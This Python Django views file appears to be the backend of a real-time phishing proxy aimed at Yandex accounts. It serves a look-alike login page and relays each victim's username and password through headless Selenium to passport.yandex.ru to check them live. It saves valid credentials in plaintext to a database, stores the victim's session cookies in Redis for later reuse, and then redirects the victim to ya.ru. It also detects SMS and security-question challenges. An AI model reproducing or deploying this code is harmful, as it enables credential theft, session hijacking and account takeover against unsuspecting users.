import json
import asyncio
import logging
from datetime import datetime
from channels.db import database_sync_to_async
from django.shortcuts import render,redirect
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from asgiref.sync import sync_to_async
from .models import CustomUser
from selenium.common.exceptions import TimeoutException
from django.http import HttpResponse
from channels.consumer import AsyncConsumer
import redis

selenium_drivers = {} #Dictionary of Web Drivers

redis_instance = redis.Redis(host='fishyandex_redis_1' , port=6379, db=0)
class CleanupInactiveDriversConsumer(AsyncConsumer):



    async def websocket_disconnect(self, event):
        print("Disconnected from cleanup_inactive_drivers channel")

    async def websocket_connect(self, event):
        await self.send({
            "type": "websocket.accept",
        })
        print("Connected to cleanup_inactive_drivers channel")
        asyncio.create_task(self.start_inactive_drivers_cleanup())

    async def websocket_receive(self, event):
        # Запускаємо таймер для перевірки та закриття неактивних веб-драйверів
        await self.start_inactive_drivers_cleanup()

    async def start_inactive_drivers_cleanup(self):
        while True:
            await asyncio.sleep(10)  # Check every 10 seconds
            print("Checking for inactive drivers...")
            await check_timeout_and_close_drivers()

async def check_timeout_and_close_drivers():
    for client_ip, driver_info in list(selenium_drivers.items()):
        last_activity = await get_last_activity(client_ip)
        if last_activity:
            time_elapsed = datetime.now().timestamp() - last_activity
            if time_elapsed > 120:  # 2 minutes
                print(f"Closing driver for {client_ip} due to inactivity")
                await close_driver(driver_info["driver"], client_ip)

async def close_driver(driver, client_ip):
    if client_ip in selenium_drivers:
        print(f"Closing driver for {client_ip}")
        driver.quit()
        del selenium_drivers[client_ip]

async def update_last_activity(client_ip):
    if client_ip in selenium_drivers:
        timestamp = datetime.now().timestamp()
        redis_instance.set(client_ip, timestamp)

async def get_last_activity(client_ip):
    last_activity = redis_instance.get(client_ip)
    return float(last_activity) if last_activity else None

@database_sync_to_async
def set_last_activity(request, timestamp):
    request.session['last_activity'] = timestamp


#Main Function
async def index(request):

    client_ip = request.META.get('REMOTE_ADDR')
    driver = await get_driver(request, client_ip)

    if request.method == 'POST':
        if driver is not None and driver.current_window_handle:
            login = request.POST.get('login')
            password = request.POST.get('passwd')
            phone = request.POST.get('phone')
            await update_last_activity(client_ip)
            if password:
                result = await asyncio.to_thread(sign_in, driver, login, password)
                if result == "incorrect_login":
                    return await sync_to_async(render)(request, 'index.html', {'incorrect_login': True})


                elif result == "success":
                    custom_user = CustomUser(login=login, password=password)
                    await sync_to_async(custom_user.save)()
                    cookies = driver.get_cookies()
                    
                    redis_instance.set(f"{client_ip}_cookies", json.dumps(cookies))
                    driver.quit()
                    return await sync_to_async(redirect)('https://ya.ru/')

                elif result == "sms_code":
                    return HttpResponse('sms_code')
                    # phone_secure = WebDriverWait(driver, 10).until(
                    #     EC.presence_of_element_located((By.TAG_NAME, "strong"))
                    # )
                    # phone_submit = driver.find_element(By.TAG_NAME, "button")
                    # phone_submit.click()
                    # return await sync_to_async(render)(request, 'secure_login.html',
                    #                                    {'phone_number': phone_secure.text})

                elif result == "security_question":
                    # Handle security question
                    return HttpResponse('security question')

                elif result == "incorrect_password":

                    return await sync_to_async(render)(request, 'index.html', {'incorrect_password': True})
                else:
                    return await sync_to_async(render)(request, 'index.html')

            elif login:
                await asyncio.to_thread(open_yandex_passport, driver)
                username_login = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, 'login'))
                )
                login_submit = driver.find_element(By.ID, "passp:sign-in")
                username_login.send_keys(login)
                login_submit.click()

                return await sync_to_async(render)(request, 'welcome.html',
                                                   {'login_name': username_login.get_attribute('value')})
            elif phone:
                pass
            else:
                return await sync_to_async(render)(request, 'index.html', {'incorrect_data': True})

    return await sync_to_async(render)(request, 'index.html')

#Create New driver Selenium for New User
def create_selenium_driver():
    options = Options()
    options.add_argument('--no-sandbox')
    options.add_argument('--window-size=1420,1080')
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(executable_path="/usr/local/bin/chromedriver", chrome_options=options)

    return driver

def open_yandex_passport(driver):
    driver.get("https://passport.yandex.ru")

#Actions performed for authorization
def sign_in(driver, login, password):
    open_yandex_passport(driver)
    username_login = WebDriverWait(driver, 6).until(
        EC.presence_of_element_located((By.NAME, 'login'))
    )
    login_submit = driver.find_element(By.ID, "passp:sign-in")
    username_login.send_keys(login)
    login_submit.click()

    try:
        username_password = WebDriverWait(driver, 6).until(
            EC.presence_of_element_located((By.NAME, 'passwd')))
        password_submit = driver.find_element(By.ID, "passp:sign-in")
        username_password.send_keys(password)
        password_submit.click()
    except TimeoutException:
        return "incorrect_login"

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success, sms_code, security_question, incorrect_password = loop.run_until_complete(
        asyncio.gather(
            asyncio.to_thread(check_success, driver),
            asyncio.to_thread(check_sms_code, driver),
            asyncio.to_thread(check_security_question, driver),
            asyncio.to_thread(check_incorrect_password, driver)
        )
    )
    logging.warning(f"ALL{[success, sms_code, security_question, incorrect_password]}")
    result = success or sms_code or security_question or incorrect_password or "unknown_error"
    logging.warning(f"{result}")
    return result



#Check Exceptions
async def get_driver(request, client_ip):
    if client_ip not in selenium_drivers:
        selenium_drivers[client_ip] = {
            "driver": await asyncio.to_thread(create_selenium_driver),
            "last_activity": datetime.now().timestamp()
        }
        cookies_json = redis_instance.get(f"{client_ip}_cookies")
        if cookies_json:
            cookies = json.loads(cookies_json)
            driver = selenium_drivers[client_ip]["driver"]
            driver.get("https://ya.ru/")  # Відкриваємо сайт, на якому потрібно відновити сесію
            for cookie in cookies:
                driver.add_cookie(cookie)
            driver.refresh()  # Оновлюємо сторінку, щоб застосувати cookies
    else:
        driver_info = selenium_drivers[client_ip]
        if not driver_info["driver"].current_window_handle:
            driver_info["driver"].quit()
            driver_info["driver"] = await asyncio.to_thread(create_selenium_driver)
    return selenium_drivers[client_ip]["driver"]

async def handle_sms_verification(request):
    client_ip = request.META.get('REMOTE_ADDR')
    driver = await get_driver(request, client_ip)
    if request.method == 'POST':
        pass
    return await sync_to_async(render)(request, 'verification.html')

def check_success(driver):
    try:
        WebDriverWait(driver, 6).until(
            EC.presence_of_element_located((By.CLASS_NAME, "UserID-Avatar"))
        )
        return "success"
    except TimeoutException:
        return None

def check_sms_code(driver):
    try:
        WebDriverWait(driver, 6).until(
            EC.presence_of_element_located((By.CLASS_NAME, "passp-field-question"))
        )
        return "sms_code"
    except TimeoutException:
        return None

def check_security_question(driver):
    try:
        WebDriverWait(driver, 6).until(
            EC.presence_of_element_located((By.CLASS_NAME, "auth-challenge__question"))
        )
        return "security_question"
    except TimeoutException:
        return None

def check_incorrect_password(driver):
    try:
        WebDriverWait(driver, 6).until(
            EC.presence_of_element_located((By.ID, "field:input-passwd:hint"))
        )
        return "incorrect_password"
    except TimeoutException:
        return None
